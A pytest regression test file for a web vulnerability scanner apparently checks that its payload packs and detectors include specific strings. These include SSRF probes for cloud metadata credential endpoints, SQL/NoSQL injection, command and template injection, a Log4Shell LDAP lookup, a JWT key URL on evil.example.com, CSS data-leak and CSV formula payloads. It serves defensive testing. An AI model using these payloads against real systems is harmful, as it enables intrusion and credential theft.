"""Regression tests for industry-grade DAST pattern extensions."""
import re
import threading
from unittest.mock import MagicMock

import pytest
import requests

from modules.api_tester import _HIDDEN_ENDPOINTS, _SSRF_URL_PARAMS, _WEBHOOK_SSRF_PAYLOADS
from modules.fuzzer import DETECTORS, PAYLOADS, Fuzzer
from modules.llm_app_scanner import LLMAppScanner, _INJECTION_PAYLOADS
from modules.nuclei_tokens import _NUCLEI_TOKEN_PATTERNS, run_checks


@pytest.mark.fuzzer
def test_ssrf_payload_pack_covers_modern_cloud_metadata_endpoints():
    payloads = set(PAYLOADS["ssrf"])

    assert "http://169.254.170.2/v2/credentials" in payloads
    assert "http://[fd00:ec2::254]/latest/meta-data/" in payloads
    assert "gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a" in payloads


@pytest.mark.fuzzer
def test_nosql_payload_pack_covers_operator_and_querystring_bypass_forms():
    payloads = set(PAYLOADS["nosql_injection"])

    assert '{"username":{"$ne":null},"password":{"$ne":null}}' in payloads
    assert "username[$ne]=&password[$ne]=" in payloads
    assert '{"$expr":{"$gt":["$balance",0]}}' in payloads


@pytest.mark.fuzzer
def test_mass_assignment_payload_pack_covers_bopla_and_tenant_controls():
    payloads = set(PAYLOADS["mass_assignment"])

    assert '{"tenant_id": "attacker-tenant"}' in payloads
    assert '{"organization_id": "attacker-org"}' in payloads
    assert '{"mfa_enabled": false}' in payloads
    assert '{"plan": "enterprise"}' in payloads


@pytest.mark.fuzzer
def test_tm_reference_parser_and_export_payloads_are_available():
    assert any("<mxfile" in payload and "mxCell" in payload for payload in PAYLOADS["xxe"])

    csv_payloads = set(PAYLOADS["csv_formula_injection"])
    assert '=HYPERLINK("http://dast-csv.example.com","DAST")' in csv_payloads
    assert '@SUM(1+1)*cmd|"/C calc"!A0' in csv_payloads


@pytest.mark.fuzzer
def test_tm_reference_report_fields_prioritize_csv_formula_injection():
    assert Fuzzer.name_based_vuln_types("report_title")[:3] == [
        "csv_formula_injection", "xss_stored", "xss_reflected",
    ]
    assert Fuzzer.name_based_vuln_types("csv_export_name")[:2] == [
        "csv_formula_injection", "xss_reflected",
    ]


@pytest.mark.fuzzer
def test_bola_and_bopla_parameter_names_are_prioritized():
    assert Fuzzer.name_based_vuln_types("tenant_id")[:3] == [
        "idor", "acl_bypass", "sqli_error",
    ]
    assert Fuzzer.name_based_vuln_types("isAdmin")[:3] == [
        "mass_assignment", "prototype_pollution_body", "acl_bypass",
    ]


@pytest.mark.fuzzer
def test_tm_reference_ticketing_ssrf_inputs_are_prioritized():
    assert {"jira_url", "azure_org", "webhook_url", "sbom_url"}.issubset(_SSRF_URL_PARAMS)
    assert (
        "http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://vault.azure.net"
    ) in _WEBHOOK_SSRF_PAYLOADS
    assert "/api/csrf-token" in _HIDDEN_ENDPOINTS
    assert "/api/v1/reports" in _HIDDEN_ENDPOINTS


@pytest.mark.llm_scanner
def test_tm_reference_llm_analysis_routes_are_detected():
    session = MagicMock(spec=requests.Session)
    session.get.return_value.status_code = 404
    session.get.return_value.text = ""
    scanner = LLMAppScanner(
        target="https://example.com",
        session=session,
        stop_event=threading.Event(),
        timeout=5,
    )

    candidates = scanner._detect_llm_endpoints([
        "https://example.com/api/analyze",
        "https://example.com/api/diagram/architecture",
    ])
    candidate_urls = {url for url, _ in candidates}

    assert "https://example.com/api/analyze" in candidate_urls
    assert "https://example.com/api/diagram/architecture" in candidate_urls


@pytest.mark.llm_scanner
def test_tm_reference_indirect_prompt_injection_payloads_are_available():
    payload_ids = {probe["id"] for probe in _INJECTION_PAYLOADS}

    assert "indirect_retrieval_poisoning" in payload_ids
    assert "tool_output_injection" in payload_ids


@pytest.mark.fuzzer
def test_ssrf_detectors_cover_azure_ecs_and_kubernetes_metadata():
    detector_text = "\n".join(pattern for pattern, _ in DETECTORS["ssrf"])

    assert re.search(r"azEnvironment", detector_text)
    assert "169\\.254\\.170\\.2" in detector_text
    assert "kubernetes\\.io/serviceaccount" in detector_text


@pytest.mark.nuclei_tokens
def test_modern_ai_and_ci_tokens_are_detected():
    body = "\n".join([
        "ANTHROPIC_API_KEY=sk-ant-api03-" + "A" * 95,
        "CIRCLE_TOKEN=circle-token_" + "b" * 40,
        "vercel_token=vercel_" + "c" * 24,
    ])

    findings = run_checks("https://example.com/config", body, {}, {})
    names = "\n".join(f["finding"] for f in findings)

    assert "Anthropic" in names
    assert "CircleCI" in names
    assert "Vercel" in names
    assert len(_NUCLEI_TOKEN_PATTERNS) >= 40


@pytest.mark.fuzzer
def test_big_dast_payload_pack_covers_core_web_injection_families():
    assert "1/**/OR/**/1=1--" in PAYLOADS["sqli_error"]
    assert "' OR JSON_EXTRACT('{\"a\":1}', '$.a')=1--" in PAYLOADS["sqli_error"]
    assert "||nslookup DAST-CMDI.example.com||" in PAYLOADS["cmdi"]
    assert "${T(java.lang.Runtime).getRuntime().exec('id')}" in PAYLOADS["ssti"]
    assert "..%252f..%252f..%252fetc%252fpasswd" in PAYLOADS["lfi"]
    assert "data://text/plain,<?php echo DAST_RFI; ?>" in PAYLOADS["rfi"]
    assert "https://trusted.example.com%2e.evil.com/callback" in PAYLOADS["open_redirect"]


@pytest.mark.fuzzer
def test_big_dast_payload_pack_covers_identity_api_and_state_abuse():
    assert (
        '{"alg":"RS256","jku":"https://evil.example.com/jwks.json","kid":"dast"}'
        in PAYLOADS["jwt_confusion"]
    )
    assert '{"role": "admin"}' in PAYLOADS["mass_assignment"]
    assert '{"is_admin": true}' in PAYLOADS["mass_assignment"]
    assert "role=user&role=admin" in PAYLOADS["hpp"]
    assert "id=1&id=2" in PAYLOADS["hpp"]
    assert "X-Forwarded-Host: dast-cache.example.com" in PAYLOADS["cache_poisoning"]
    assert "dast-cache.example.com" in PAYLOADS["host_header"]


@pytest.mark.fuzzer
def test_big_dast_payload_pack_covers_parser_and_supply_chain_families():
    assert r'O:8:"stdClass":1:{s:4:"dast";s:4:"test";}' in PAYLOADS["deserialization"]
    assert '<foo><![CDATA[</foo><script>alert(1)</script>]]></foo>' in PAYLOADS["xml_injection"]
    assert (
        "<xsl:stylesheet version=\"1.0\"><xsl:template match=\"/\">"
        "<xsl:value-of select=\"system-property('xsl:vendor')\"/>"
        "</xsl:template></xsl:stylesheet>"
    ) in PAYLOADS["xslt_injection"]
    assert "${${::-j}${::-n}${::-d}${::-i}:ldap://dast-log4shell.example.com/a}" in PAYLOADS["log4shell"]
    assert 'body{background:url("https://dast-css.example.com/leak")}' in PAYLOADS["css_injection"]


@pytest.mark.fuzzer
def test_big_dast_detectors_cover_framework_error_signals():
    sqli_detector_text = "\n".join(pattern for pattern, _ in DETECTORS["sqli_error"])
    cmdi_detector_text = "\n".join(pattern for pattern, _ in DETECTORS["cmdi"])
    deser_detector_text = "\n".join(pattern for pattern, _ in DETECTORS["deserialization"])
    ssrf_detector_text = "\n".join(pattern for pattern, _ in DETECTORS["ssrf"])
    jwt_detector_text = "\n".join(pattern for pattern, _ in DETECTORS["jwt_confusion"])
    cache_detector_text = "\n".join(pattern for pattern, _ in DETECTORS["cache_poisoning"])

    assert "PrismaClientKnownRequestError" in sqli_detector_text
    assert "Process exited with" in cmdi_detector_text
    assert "StreamCorruptedException" in deser_detector_text
    assert "x-aws-ec2-metadata-token" in ssrf_detector_text
    assert "JWKS" in jwt_detector_text
    assert r"X-Cache\s*:\s*HIT" in cache_detector_text


@pytest.mark.fuzzer
def test_big_dast_parameter_rules_prioritize_more_sinks():
    assert Fuzzer.name_based_vuln_types("jku")[:2] == ["jwt_confusion", "ssrf"]
    assert Fuzzer.name_based_vuln_types("kid")[:2] == ["jwt_confusion", "lfi"]
    assert Fuzzer.name_based_vuln_types("webhook_secret")[:3] == [
        "ssrf", "header_injection", "mass_assignment",
    ]
    assert Fuzzer.name_based_vuln_types("template_url")[:3] == [
        "ssrf", "open_redirect", "ssti",
    ]
